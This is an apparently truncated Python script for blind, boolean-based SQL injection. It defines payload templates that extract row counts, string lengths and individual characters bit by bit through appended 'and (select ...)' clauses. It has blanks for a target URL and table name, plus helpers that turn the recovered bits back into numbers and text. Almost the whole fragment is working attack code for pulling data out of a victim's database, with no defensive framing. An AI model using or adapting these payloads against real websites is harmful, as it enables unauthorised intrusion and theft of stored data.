DATA_COUNT_SHIFT_QUERY = ' and (select substr(lpad(bin(count({0})>>{1}),8,0),8,1)=1)'
DATA_LENGTH_SHIFT_QUERY = ' and (select substr(lpad(bin(length({0})>>{1}),8,0),8,1)=1)'
DATA_BIT_SHIFT_QUERY = ' and (select substr(lpad(bin(ascii(substr({0},{1},1))>>{2}),8,0),8,1)=1 LIMIT {3}, 1)'
# Insert target url
TARGET_URL = ''
# insert your table name
TABLE_NAME = ''


def parsing_bin_list_to_decimal(bin_list):
    return int(''.join(bin_list), 2)


def parsing_bin_list_to_char(bin_list):
    return chr(parsing_bin_list_to_decimal(bin_list))
